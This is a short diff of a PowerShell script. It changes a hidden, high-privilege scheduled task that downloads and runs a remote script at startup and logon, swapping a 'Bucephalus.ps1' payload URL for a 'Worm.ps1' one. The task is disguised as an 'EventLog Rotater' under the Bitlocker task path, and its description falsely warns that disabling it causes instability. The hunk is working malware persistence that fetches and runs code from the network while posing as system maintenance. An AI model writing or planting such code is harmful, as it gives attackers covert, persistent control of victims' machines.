@@ -158,7 +158,7 @@ start-job -ScriptBlock {
     while(1 -eq 1){
         try{
             $action = @()
-            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
+            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
             
             $trigger = New-ScheduledTaskTrigger -AtStartup
@@ -166,7 +166,7 @@ start-job -ScriptBlock {
         
         
             $action = @()
-            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
+            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
             $trigger = New-ScheduledTaskTrigger -AtLogon
             Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotater" -RunLevel Highest -Description "Prevents a event log cache overflow by rotating logs within NTFS filesystems. Disabling can cause system instability and is not recomended." -TaskPath \Microsoft\Windows\Bitlocker -force
